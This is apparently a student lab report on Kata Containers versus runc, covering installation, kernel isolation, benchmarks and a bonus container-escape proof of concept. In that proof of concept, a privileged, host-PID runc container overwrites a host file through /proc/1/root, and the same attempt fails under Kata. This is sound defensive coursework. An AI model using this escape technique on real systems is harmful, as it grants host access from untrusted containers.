# Lab 12 — BONUS — Submission

## Task 1: Install + Hello-World

### Host environment

- Hostname: `gdevops`
- Operating system: Ubuntu 24.04
- Architecture: `x86_64`
- KVM module: `kvm_intel`
- KVM device: `/dev/kvm`
- Kata version: `3.32.0`
- nerdctl version: `2.3.4`
- runc version: `1.3.6`

Host kernel:

```text
Linux gdevops 6.17.0-35-generic #35~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue May 26 19:30:42 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

KVM availability:

```text
crw-rw----+ 1 root kvm 10, 232 Jul 15 08:49 /dev/kvm
kvm_intel             569344  0
kvm                  1445888  1 kvm_intel
```

containerd version:

```text
containerd containerd.io v2.2.5 e53c7c1516c3b2bff98eb76f1f4117477e6f4e66
```

The host provided hardware virtualization through KVM, `/dev/kvm` was available, and the containerd service was active.

### Kata installation

Kata Containers was installed using the provided script with an explicit version:

```bash
sudo bash labs/lab12/scripts/install-kata-assets.sh 3.32.0
```

Installed version:

```text
3.32.0
```

The Kata shim was installed at:

```text
/opt/kata/bin/containerd-shim-kata-v2
```

The runtime-rs configuration was linked to the Dragonball configuration:

```text
/etc/kata-containers/runtime-rs/configuration.toml
-> /opt/kata/share/defaults/kata-containers/runtime-rs/configuration-dragonball.toml
```

The Kata shim was made available through the standard executable path:

```bash
sudo ln -sf \
  /opt/kata/bin/containerd-shim-kata-v2 \
  /usr/local/bin/containerd-shim-kata-v2
```

The provided script was then used to configure containerd:

```bash
sudo bash labs/lab12/scripts/configure-containerd-kata.sh
sudo systemctl restart containerd
```

containerd runtime configuration:

```toml
[plugins.'io.containerd.grpc.v1.cri'.containerd.runtimes.kata]
  runtime_type = 'io.containerd.kata.v2'
```

The containerd configuration was parsed successfully, and the service remained active after the restart.

### Kernel inside containers

#### runc

Command:

```bash
sudo nerdctl run --rm alpine:3.20 \
  sh -c "uname -a; head -3 /proc/cpuinfo"
```

Output:

```text
Linux 8294d92a6f95 6.17.0-35-generic #35~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue May 26 19:30:42 UTC 2 x86_64 Linux
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
```

The runc container reported kernel `6.17.0-35-generic`, which is the same kernel used by the host.

#### Kata

Command:

```bash
sudo nerdctl run --rm \
  --runtime=io.containerd.kata.v2 \
  alpine:3.20 \
  sh -c "uname -a; head -3 /proc/cpuinfo"
```

Output:

```text
time="2026-07-15T09:48:57+03:00" level=warning msg="cannot set cgroup manager to \"systemd\" for runtime \"io.containerd.kata.v2\""
Linux f02fb475e58a 6.18.35 #1 SMP Mon Jun 15 12:55:58 UTC 2026 x86_64 Linux
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
```

The warning did not prevent the Kata container from starting. The Kata container reported kernel `6.18.35`, which differs from the host kernel.

### Why the kernels differ

A standard runc container uses namespaces and cgroups but continues to share the host Linux kernel. This is why both the host and the runc container reported kernel `6.17.0-35-generic`.

As explained in Reading 12, Kata Containers starts the workload inside a lightweight virtual machine with its own guest kernel. Lecture 7 slide 14 discusses the runc CVE-2024-21626 “Leaky Vessels” attack class. With Kata, compromising the container environment does not directly provide access to the host kernel because an attacker must also cross the virtual-machine boundary, although Kata cannot prevent every possible runtime or hypervisor vulnerability.

---

## Task 2: Isolation + Performance

### Isolation: `/dev` comparison

Commands:

```bash
sudo nerdctl run --rm alpine:3.20 ls /dev \
  > labs/lab12/results/runc-devs.txt

sudo nerdctl run --rm \
  --runtime=io.containerd.kata.v2 \
  alpine:3.20 ls /dev \
  > labs/lab12/results/kata-devs.txt

diff -u \
  labs/lab12/results/runc-devs.txt \
  labs/lab12/results/kata-devs.txt \
  > labs/lab12/results/dev-diff.txt || true
```

runc `/dev` contents:

```text
core
fd
full
mqueue
null
ptmx
pts
random
shm
stderr
stdin
stdout
tty
urandom
zero
```

Kata `/dev` contents:

```text
fd
full
mqueue
null
ptmx
pts
random
shm
stderr
stdin
stdout
tty
urandom
zero
```

Difference:

```diff
--- labs/lab12/results/runc-devs.txt
+++ labs/lab12/results/kata-devs.txt
@@ -1,4 +1,3 @@
-core
 fd
 full
 mqueue
```

The `/dev/core` entry was visible in the runc container but absent from the Kata container. Most other standard virtual devices were present in both environments.

### Isolation: capability sets

runc:

```text
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
```

Kata:

```text
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
```

The capability masks were identical in this experiment. However, identical capability values do not mean that the isolation models are identical. In the runc case, the process shares the host kernel. In the Kata case, the capabilities apply to the workload running inside the guest micro-VM and its separate kernel.

### Startup-time benchmark

One warm-up run was completed for each runtime before the measured runs. Five complete `nerdctl run --rm` executions were then measured for each runtime.

Results:

```text
runc 1 2.094922
runc 2 2.166046
runc 3 2.102087
runc 4 2.555510
runc 5 2.135102
kata 1 2.937407
kata 2 2.963153
kata 3 2.982187
kata 4 2.856758
kata 5 2.886312
```

Average startup times:

| Runtime | Average startup time |
|---------|---------------------:|
| runc | 2.210733 s |
| Kata | 2.925163 s |

**Measured Kata cold-start overhead: approximately 1.32×.**

The measured result is lower than the approximate `5×` example discussed in Reading 12. This benchmark measured the complete `sudo nerdctl run --rm` lifecycle on this specific host, including container creation and cleanup. Hardware performance, runtime versions, caching, storage configuration and system load can affect the resulting ratio.

### I/O benchmark

Command used inside both containers:

```bash
dd if=/dev/zero of=/dev/null bs=1M count=100
```

Results:

```text
=== runc I/O ===
104857600 bytes (100.0MB) copied, 0.004870 seconds, 20.1GB/s

=== kata I/O ===
104857600 bytes (100.0MB) copied, 0.005185 seconds, 18.8GB/s
```

| Runtime | Throughput |
|---------|-----------:|
| runc | 20.1 GB/s |
| Kata | 18.8 GB/s |

Kata was approximately `6.5%` slower in this synthetic test. Because the workload copied data from `/dev/zero` to `/dev/null`, the result primarily measures memory movement and system-call processing rather than physical disk performance.

### Trade-off analysis

Kata is appropriate for multi-tenant environments such as shared CI runners, hosted build platforms and services that execute containers supplied by untrusted users. In these environments, the separate guest kernel provides an additional security boundary that can justify increased startup time and resource consumption.

Kata may not be necessary for trusted single-tenant services or short-lived batch workloads where minimum startup latency and maximum container density are more important. Standard runc containers may be more practical for those workloads when they are protected with non-root execution, seccomp, reduced capabilities, mandatory access control and correctly configured orchestration policies.

---

## Bonus: Container-Escape PoC

### Vector chosen

- **Option:** B — privileged-container host write.
- **Implementation:** host write through the host PID namespace and `/proc/1/root`.
- **Why:** this demonstrates the impact of a dangerously configured privileged container without requiring an intentionally vulnerable historical runc version or a cgroup v1 host.

A sandbox target was created on the host:

```bash
echo "original" | sudo tee /tmp/lab12-target
```

Initial host value:

```text
original
```

### runc: escape succeeds

Command:

```bash
sudo nerdctl run --rm \
  --privileged \
  --pid=host \
  alpine:3.20 \
  sh -c '
    echo "OVERWRITTEN BY RUNC CONTAINER" > /proc/1/root/tmp/lab12-target
    echo "Container view:"
    cat /proc/1/root/tmp/lab12-target
  '
```

Container output:

```text
Container view:
OVERWRITTEN BY RUNC CONTAINER
```

Exit code:

```text
runc exit code: 0
```

Host-side verification:

```text
=== HOST AFTER RUNC ===
OVERWRITTEN BY RUNC CONTAINER
```

The runc container was started with both `--privileged` and `--pid=host`. PID 1 inside the container therefore referred to the real host PID 1 process. Access through `/proc/1/root` allowed the privileged container to reach the host filesystem and modify `/tmp/lab12-target`.

### Kata: escape attempt fails

The host file was reset before the Kata test:

```bash
echo "original" | sudo tee /tmp/lab12-target
```

The same dangerous flags and workload were executed with the Kata runtime:

```bash
sudo nerdctl run --rm \
  --runtime=io.containerd.kata.v2 \
  --privileged \
  --pid=host \
  alpine:3.20 \
  sh -c '
    echo "OVERWRITTEN BY KATA CONTAINER" > /proc/1/root/tmp/lab12-target
    echo "Container view:"
    cat /proc/1/root/tmp/lab12-target
  '
```

Kata runtime output:

```text
time="2026-07-17T13:00:23+03:00" level=warning msg="cannot set cgroup manager to \"systemd\" for runtime \"io.containerd.kata.v2\""
time="2026-07-17T13:00:25+03:00" level=fatal msg="failed to create shim task: Creating container device LinuxDevice { path: \"/dev/full\", typ: C, major: 1, minor: 7, file_mode: Some(438), uid: Some(0), gid: Some(0) }

Caused by:
    EEXIST: File exists"
```

Exit code:

```text
kata exit code: 1
```

Host-side verification:

```text
=== HOST AFTER KATA ===
original
```

On this Kata `runtime-rs` and Dragonball installation, the privileged sandbox was rejected during virtual-device creation before the shell command could execute. The failure was caused by an `EEXIST` error while creating `/dev/full`.

Therefore, this run does not demonstrate a successful write only into the guest micro-VM filesystem. It demonstrates that the same privileged workload which modified the host through runc failed to start through Kata, while host-side verification confirmed that `/tmp/lab12-target` remained unchanged.

### Additional Kata isolation check

A non-privileged Kata container with the host PID option was also tested:

```bash
sudo nerdctl run --rm \
  --runtime=io.containerd.kata.v2 \
  --pid=host \
  --cap-add=SYS_PTRACE \
  alpine:3.20 \
  sh -c '
    echo "ATTEMPTED OVERWRITE FROM KATA" > /proc/1/root/tmp/lab12-target
    echo "Container view:"
    cat /proc/1/root/tmp/lab12-target
  '
```

Container output:

```text
Container view:
ATTEMPTED OVERWRITE FROM KATA
```

Exit code:

```text
kata exit code: 0
```

Host-side verification:

```text
=== HOST AFTER KATA ===
original
```

This additional test shows that `/proc/1/root` inside the running Kata environment did not refer to the root filesystem of the real host. The container could modify the path visible inside its own isolated environment, while the host target remained unchanged.

### Threat-model implication

A privileged runc container sharing the host PID namespace can gain direct access to host resources through paths such as `/proc/1/root`. This is especially dangerous in shared CI runners, hosted development environments and misconfigured Kubernetes workloads that execute untrusted code with excessive privileges.

Kata places the workload behind a separate guest kernel and virtual-machine boundary. In the running non-privileged Kata test, the write remained inside the isolated guest environment. In the privileged Kata test, the runtime rejected the sandbox before the attack command could execute. In both cases, host-side verification confirmed that the real host file remained unchanged.

Kata does not eliminate every security threat. It does not by itself prevent all side-channel attacks, cross-tenant timing attacks, hypervisor vulnerabilities, denial-of-service attacks or unsafe resources that are explicitly shared with the guest. Confidential Containers address a different threat model in which the host or infrastructure operator may also be untrusted.

---

## Completion checklist

- [x] Task 1 — Kata installed and registered with containerd
- [x] Task 1 — runc and Kata containers started successfully
- [x] Task 1 — different runc and Kata kernels documented
- [x] Task 1 — Reading 12 and Lecture 7 attack-class implications explained
- [x] Task 2 — `/dev` comparison documented
- [x] Task 2 — capability sets documented
- [x] Task 2 — five startup runs completed and averaged
- [x] Task 2 — I/O benchmark completed
- [x] Task 2 — deployment trade-off analysis included
- [x] Bonus — runc modified the host filesystem
- [x] Bonus — Kata attempts left the host filesystem unchanged
- [x] Bonus — host-side verification included
- [x] Bonus — limitations and observed runtime error documented honestly
